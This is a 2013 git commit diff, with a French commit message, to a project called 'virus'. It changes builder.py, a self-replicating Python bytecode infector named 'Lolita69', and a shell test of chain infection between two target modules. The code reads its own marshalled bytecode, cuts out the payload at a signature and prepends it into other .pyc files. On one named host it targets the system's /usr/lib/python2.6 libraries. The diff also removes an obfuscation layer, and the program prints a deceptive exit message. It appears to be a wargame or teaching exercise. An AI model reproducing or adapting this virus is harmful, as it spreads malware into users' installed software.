8a5d717291ec99f740cb8a875a8f87d72821eeae
ClementNotin <clement@notin.org>
2013-02-20 21:10:05 +0100

    WIP, test d'infection en chaine avec 2 targets imbriqués

--- virus/builder.py
+++ virus/builder.py
@@ -6,71 +6,47 @@ import zlib
 import glob
 from base64 import b64decode, b64encode
 
+
+
 if __file__.endswith('.pyc'):
-
-
-    def no_op_layer_crypt(clear):
-        return clear
-
-
-    no_op_layer_DECRYPT = """
-def decrypt(crypted):
-    return crypted
-    """
-
-    def obfuscate(marshalled, layer_crypt=no_op_layer_crypt, layer_DECRYPT=no_op_layer_DECRYPT):
-        # compress step
-        compressed = zlib.compress(marshalled)
-
-        # crypt step
-        crypted = layer_crypt(compressed)
-
-        # B64 step
-        b64 = b64encode(crypted)
-
-        # template injection step
-        template = b64decode("__TEMPLATE_PY__")
-        template = template.replace("__PAYLOAD_PLACEHOLDER__", b64)
-        template = template.replace("__DECRYPT_PLACEHOLDER__", layer_DECRYPT)
-
-        # template compile step
-        template_compiled = compile(template, "z", "exec")
-
-        # marshall step
-        return marshal.dumps(template_compiled)
-
-
-
     # ------------- GENERATING BYTEPLAY DATA (for injector) ---------------
     byteplay = None
+    Code = None
     exec b64decode("__BYTEPLAY_PY__")
-    byteplay_src = b64encode(zlib.compress("__BYTEPLAY_PY__", 9))
+
+    f = open(__file__, 'r')
+    head = f.read(8)
+    data = Code.from_code(marshal.loads(f.read()))
+    f.close()
+    payload = data
+
+    EXPLOIT_SIZE = None
+    for i in xrange(2, len(data.code)):
+        if type(data.code[i][1]) == type('') and data.code[i][1] == signature:
+            EXPLOIT_SIZE = i + 2
+            break
+
+    if not EXPLOIT_SIZE:
+        print "EXPLoiT_ISZE not found"
+
+    payload = data.code[:EXPLOIT_SIZE]
 
     # ------------- GENERATING PAYLOAD DATA ---------------
-    payload = "__PAYLOAD_PY__"
-    payload = Code.from_code(compile(b64decode(payload), "a", "exec"))
-    payload.code = payload.code[:-1]
-    for i, instr in enumerate(payload.code):
-        if instr[0] == SetLineno:
-            payload.code.pop(i)
-    payload = b64encode(marshal.dumps(payload.to_code()))
-
-
-    def infect(f_to_infect, payload):
-        print "j'injecte %s"%payload.code
+    def infect(f_to_infect):
         if f_to_infect.endswith("socket.pyc"):
             return
 
         f = open(f_to_infect, 'r')
 
-        #Magic number and timestamp
         head = f.read(8)
 
         data = Code.from_code(marshal.loads(f.read()))
+        if data.code[1][1] == signature:
+            return
 
         f.close()
 
-        data.code[:0] = payload.code
+        data.code[:0] = payload[:-1]
 
         newfile = open(f_to_infect, 'w')
         newfile.write(head)
@@ -78,32 +54,6 @@ def decrypt(crypted):
         newfile.close()
 
 
-    f = open(__file__, 'r')
-    head = f.read(8)
-    data = Code.from_code(marshal.loads(f.read()))
-    f.close()
-    payload = data
-    print "loaded payload"
-    print payload.code
-
-    EXPLOIT_SIZE = None
-    for i in xrange(2, len(data.code)):
-      if type(data.code[i][1]) == type('') and data.code[i][1] == signature:
-         EXPLOIT_SIZE = i+1
-         break
-
-    if not EXPLOIT_SIZE:
-        print "EXPLoiT_ISZE not found"
-        print data.code
-
-    data.code = data.code[:EXPLOIT_SIZE]
-    lolita = marshal.dumps(data.to_code())
-
-    #for i in range(1):
-    #    lolita = obfuscate(lolita)#, xor_layer)
-
-    lolita = Code.from_code(marshal.loads(lolita))
-    
     print """
 
     LLLLLLLLLLL                              lllllll   iiii          tttt                                         66666666  999999999
@@ -127,12 +77,12 @@ def decrypt(crypted):
     if socket.gethostname() == "OT-Wargame":
         target_dir = "/usr/lib/python2.6/*.pyc"
     else:
-        target_dir = "./targets/*.pyc"
+        target_dir = "./targets/hello.pyc"
 
     for i in glob.glob(target_dir):
-        infect(i, lolita)
-
+        infect(i)
 
     print "Unfortunately your computer's specifications do not allow you access to our service.\nExiting..."
+    print "FAIRE DU MAL"
 
 signature = "PY_2.6"
--- virus/test.sh
+++ virus/test.sh
@@ -1,17 +1,23 @@
 #!/bin/sh
 
-echo "Building..."
-python builder.py
-echo "Build complete."
-
 echo "\nExec before infect:"
-(cd targets; rm *.pyc; python -c "import hello")
+(cd targets; rm *.pyc; python -c "import hello"; (cd targets; rm *.pyc; python -c "import hello_bis"))
 echo "Executed."
 
-echo "\nTesting Lolita69..."
-python lolita.final.pyc
-echo "Test complete."
+echo "Building..."
+python meta_builder.py
+python -c "import builder_generated"
+python builder_generated.pyc
+echo "Build complete."
 
-echo "\nExec after infect:"
+echo "\nExec hello_bis, should be clean:"
+(cd targets/targets; python -c "import hello_bis"; echo "Python interpreter returned: "$?" (0 is a cool value!)")
+echo "Executed."
+
+echo "\nExec hello, should infect hello_bis:"
 (cd targets; python -c "import hello"; echo "Python interpreter returned: "$?" (0 is a cool value!)")
+echo "Executed."
+
+echo "\nExec hello_bis, should be infected now:"
+(cd targets/targets; python -c "import hello_bis"; echo "Python interpreter returned: "$?" (0 is a cool value!)")
 echo "Executed."
